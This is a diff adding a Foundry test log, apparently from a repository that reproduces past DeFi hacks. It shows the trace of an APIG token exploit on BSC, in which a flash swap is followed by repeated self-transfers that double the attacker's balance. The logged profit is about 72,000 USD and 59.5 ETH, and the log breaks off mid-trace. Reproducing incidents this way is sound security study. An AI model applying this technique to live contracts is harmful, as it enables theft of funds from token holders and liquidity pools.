@@ -1,0 +1,512 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.25s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2072): Unused local variable.
+  --> src/test/2023-09/APIG_exp.sol:87:9:
+   |
+87 |         uint256[] memory APIG_BETH = router.getAmountsIn(amount59500, path);
+   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 275.44ms (99.69µs CPU time)
+
+Ran 1 test for src/test/2023-09/APIG_exp.sol:ContractTest
+[PASS] testExploit() (gas: 4224490)
+Logs:
+  Attack Exploit: 72113.575425255057150292 USD
+  Attack Exploit: 59.500000000000000000 ETH
+
+Traces:
+  [4835490] ContractTest::testExploit()
+    ├─ [2531] BSC-USD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 10000000000000000 [1e16]
+    ├─ [4812519] 0xadad_Pair::swap(500000000000000000000 [5e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000)
+    │   ├─ [10871] BSC-USD::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   ├─ emit Transfer(from: 0xadad_Pair: [0xaDaD973f8920bc511d94aade2762284f621F1467], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   └─ ← [Return] true
+    │   ├─ [4760055] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20], 0, 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000)
+    │   │   ├─ [8071] BSC-USD::transfer(0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d], 500000000000000000000 [5e20])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d], value: 500000000000000000000 [5e20])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [9611] PancakeRouter::getAmountsOut(500000000000000000000 [5e20], [0x55d398326f99059fF775485246999027B3197955, 0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888]) [staticcall]
+    │   │   │   ├─ [2893] 0xefbf_Pair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 72178575425255057150292 [7.217e22], 14435615347543513039569200 [1.443e25], 1694173970 [1.694e9]
+    │   │   │   └─ ← [Return] [500000000000000000000 [5e20], 99064778628816195850726 [9.906e22]]
+    │   │   ├─ [1837537] 0xefbf_Pair::swap(0, 99064778628816195850726 [9.906e22], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [1795313] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99064778628816195850726 [9.906e22])
+    │   │   │   │   ├─ [465] 0xefbf_Pair::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] BSC-USD: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [893] 0xefbf_Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 72178575425255057150292 [7.217e22], 14435615347543513039569200 [1.443e25], 1694173970 [1.694e9]
+    │   │   │   │   ├─ [531] BSC-USD::balanceOf(0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 72678575425255057150292 [7.267e22]
+    │   │   │   │   ├─ [2439] 0xefbf_Pair::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1020752150284861806910424 [1.02e24]
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xBF3b3C2a3d36d3Dbc0eAf0e9b4bAd0C5798a6Cb7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2828225710532627724496 [2.828e21]
+    │   │   │   │   ├─ [28931] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xBF3b3C2a3d36d3Dbc0eAf0e9b4bAd0C5798a6Cb7, 27707271640264028619 [2.77e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xfe424bDF8d79090D57F50f5E3E02E6790782c3dF) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2828425710532627724502 [2.828e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xfe424bDF8d79090D57F50f5E3E02E6790782c3dF, 27709230979756423378 [2.77e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xfd88b3014E4250F48563B4fc1e5093E674872D2F) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2821356056934324622353 [2.821e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xfd88b3014E4250F48563B4fc1e5093E674872D2F, 27639971722292893466 [2.763e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xFc86C5C542753507eC96ae8Ff8F2A0D4b10E91de) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2821356056934324622353 [2.821e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xFc86C5C542753507eC96ae8Ff8F2A0D4b10E91de, 27639971722292893466 [2.763e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xfc7205D3eDDa9D18edAFA25Dfc5a2AC1faD12d49) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2827012911183817002547 [2.827e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xfc7205D3eDDa9D18edAFA25Dfc5a2AC1faD12d49, 27695390211961651147 [2.769e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xf3BA72E69D199eA17BB01386a6CbBcb08b5e2A0E) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1414213562373095048798 [1.414e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xf3BA72E69D199eA17BB01386a6CbBcb08b5e2A0E, 13854622417189420284 [1.385e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xf39F57B8bb1F6747B4881Ea07bc61bb777884d85) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2828425710532627724502 [2.828e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xf39F57B8bb1F6747B4881Ea07bc61bb777884d85, 27709230979756423378 [2.77e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xF28794aD0cD190B63f7F599E2043765288FA6AD2) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2827012911183817002548 [2.827e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xF28794aD0cD190B63f7F599E2043765288FA6AD2, 27695390211961651147 [2.769e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xF27657429F9BD553cfb4a0D3ad51c6F99f9535d1) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1414213562373095048798 [1.414e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xF27657429F9BD553cfb4a0D3ad51c6F99f9535d1, 13854622417189420284 [1.385e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xf048DcCC229D1A028c28af2B70332bd63f31f692) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2828425710532627724502 [2.828e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xf048DcCC229D1A028c28af2B70332bd63f31f692, 27709230979756423378 [2.77e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xf00d2503206946F53880317dc6908b6Db5738Dd1) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2821356056934324622354 [2.821e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xf00d2503206946F53880317dc6908b6Db5738Dd1, 27639971722292893466 [2.763e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xEF12F3D2264E5A22684E67d36A8d5aafCFbBf529) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2814284989122459147109 [2.814e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xEF12F3D2264E5A22684E67d36A8d5aafCFbBf529, 27570698610206946365 [2.757e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xeE80Df2a2Ff8552ce20b78e9ba6e457E9210Dd8B) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2828425710532627724501 [2.828e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xeE80Df2a2Ff8552ce20b78e9ba6e457E9210Dd8B, 27709230979756423378 [2.77e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xeE23e7f417460980cf7c745E8C91f458E2d6a93E) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 869188106050591605889 [8.691e20]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xeE23e7f417460980cf7c745E8C91f458E2d6a93E, 8515172912523641039 [8.515e18])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xeC6d50e909d1002143C4bAfEa9b072287fA16aC2) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2821356056934324622353 [2.821e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xeC6d50e909d1002143C4bAfEa9b072287fA16aC2, 27639971722292893466 [2.763e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xe683609950957f7B9f45aBa373e0Cc6A43609831) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2814284989122459147110 [2.814e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xe683609950957f7B9f45aBa373e0Cc6A43609831, 27570698610206946365 [2.757e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xE668ddE9C92796155b5275E18D948E36FFd69B1D) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1414213562373095048799 [1.414e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xE668ddE9C92796155b5275E18D948E36FFd69B1D, 13854622417189420284 [1.385e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xE53eB281A1dBC353ecFDF8f37990803C7e8d186a) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 707106781186547524399 [7.071e20]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xE53eB281A1dBC353ecFDF8f37990803C7e8d186a, 6927311208594710142 [6.927e18])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xe50119BC39fC702Daf036c782DceCAB8EFD6016f) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2827012911183817002548 [2.827e21]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xe50119BC39fC702Daf036c782DceCAB8EFD6016f, 27695390211961651147 [2.769e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xe418917c3E969665f2359AFDfbF34707C1102E09) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 113137084989847603889 [1.131e20]
+    │   │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xe418917c3E969665f2359AFDfbF34707C1102E09, 1108369793375153622 [1.108e18])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: 0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d], to: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], value: 29719433588644858755 [2.971e19])
+    │   │   │   │   ├─ emit Transfer(from: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], to: 0x017ad2208e0eCC35458C93fa14B77dC7c4cF2AE9, value: 9906477862 [9.906e9])
+    │   │   │   │   ├─ emit Transfer(from: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], to: 0x0178a4C8178a4c8178A4C8178a4C8178a4c8178a, value: 9005888966 [9.005e9])
+    │   │   │   │   ├─ emit Transfer(from: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], to: 0x01767DCe434a9B101767DcE434a9B101767DcE43, value: 8255398219 [8.255e9])
+    │   │   │   │   ├─ emit Transfer(from: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], to: 0x01745D1745d1745D1745D1745d1745D1745d1745, value: 7620367586 [7.62e9])
+    │   │   │   │   ├─ emit Transfer(from: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], to: 0x01724287f46debc05C90A1fd1B7aF01724287f46, value: 7076055616 [7.076e9])
+    │   │   │   │   ├─ emit Transfer(from: 0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 960928352699517099745 [9.609e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] BSC-USD::balanceOf(0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d]) [staticcall]
+    │   │   │   │   └─ ← [Return] 72678575425255057150292 [7.267e22]
+    │   │   │   ├─ [5873] APIG::balanceOf(0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d]) [staticcall]
+    │   │   │   │   └─ ← [Return] 14434624699757224877610700 [1.443e25]
+    │   │   │   ├─ emit Sync(reserve0: 72678575425255057150292 [7.267e22], reserve1: 14434624699757224877610700 [1.443e25])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 500000000000000000000 [5e20], amount1In: 98074130842528033892226 [9.807e22], amount0Out: 0, amount1Out: 99064778628816195850726 [9.906e22], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [531] BSC-USD::balanceOf(0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d]) [staticcall]
+    │   │   │   └─ ← [Return] 72678575425255057150292 [7.267e22]
+    │   │   ├─ [5191] PancakeRouter::getAmountsIn(72628575425255057150292 [7.262e22], [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888, 0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   ├─ [893] 0xefbf_Pair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 72678575425255057150292 [7.267e22], 14434624699757224877610700 [1.443e25], 1694174396 [1.694e9]
+    │   │   │   └─ ← [Return] [21019874260482551187041397747 [2.101e28], 72628575425255057150292 [7.262e22]]
+    │   │   ├─ [2531] ETH::balanceOf(0xb920_Pair: [0xb920456AeC6E88c68C16c8294688B2b63C81B2Ce]) [staticcall]
+    │   │   │   └─ ← [Return] 59600000000000000000 [5.96e19]
+    │   │   ├─ [9691] PancakeRouter::getAmountsIn(59500000000000000000 [5.95e19], [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888, 0x2170Ed0880ac9A755fd29B2688956BD959F933F8]) [staticcall]
+    │   │   │   ├─ [2893] 0xb920_Pair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 59600000000000000000 [5.96e19], 83000000000000000000000000 [8.3e25], 1693065635 [1.693e9]
+    │   │   │   └─ ← [Return] [49508771929824561403508771930 [4.95e28], 59500000000000000000 [5.95e19]]
+    │   │   ├─ [5776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 960928352699517099745 [9.609e20]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 960928352699517099745 [9.609e20])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 960928352699517099745 [9.609e20])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1921856705399034199490 [1.921e21]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1921856705399034199490 [1.921e21])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1921856705399034199490 [1.921e21])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 3843713410798068398980 [3.843e21]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3843713410798068398980 [3.843e21])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3843713410798068398980 [3.843e21])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 7687426821596136797960 [7.687e21]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7687426821596136797960 [7.687e21])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7687426821596136797960 [7.687e21])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 15374853643192273595920 [1.537e22]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 15374853643192273595920 [1.537e22])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 15374853643192273595920 [1.537e22])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 30749707286384547191840 [3.074e22]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30749707286384547191840 [3.074e22])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 30749707286384547191840 [3.074e22])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 61499414572769094383680 [6.149e22]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 61499414572769094383680 [6.149e22])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 61499414572769094383680 [6.149e22])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 122998829145538188767360 [1.229e23]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 122998829145538188767360 [1.229e23])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 122998829145538188767360 [1.229e23])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 245997658291076377534720 [2.459e23]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 245997658291076377534720 [2.459e23])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 245997658291076377534720 [2.459e23])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 491995316582152755069440 [4.919e23]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 491995316582152755069440 [4.919e23])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 491995316582152755069440 [4.919e23])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 983990633164305510138880 [9.839e23]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 983990633164305510138880 [9.839e23])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 983990633164305510138880 [9.839e23])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1967981266328611020277760 [1.967e24]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1967981266328611020277760 [1.967e24])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1967981266328611020277760 [1.967e24])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 3935962532657222040555520 [3.935e24]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3935962532657222040555520 [3.935e24])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3935962532657222040555520 [3.935e24])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 7871925065314444081111040 [7.871e24]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7871925065314444081111040 [7.871e24])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7871925065314444081111040 [7.871e24])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 15743850130628888162222080 [1.574e25]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 15743850130628888162222080 [1.574e25])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 15743850130628888162222080 [1.574e25])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
